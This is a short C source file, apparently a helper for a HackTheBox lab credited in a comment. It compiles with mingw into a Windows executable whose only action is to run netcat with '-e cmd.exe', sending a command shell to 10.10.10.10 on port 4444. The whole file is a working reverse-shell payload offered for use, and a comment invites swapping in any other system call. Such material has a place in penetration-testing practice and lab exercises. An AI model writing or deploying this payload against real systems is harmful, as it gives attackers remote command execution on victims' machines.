#include "stdlib.h"
//#include "stdafx.h" speeds up compile time 
// i686-w64-mingw32-gcc shell.c -o shell.exe


// Originally from https://snowscan.io/htb-writeup-giddy/#
// But you could replace the system call with anything
int main()
{
    system("nc.exe -e cmd.exe 10.10.10.10 4444");
    return 0;
}
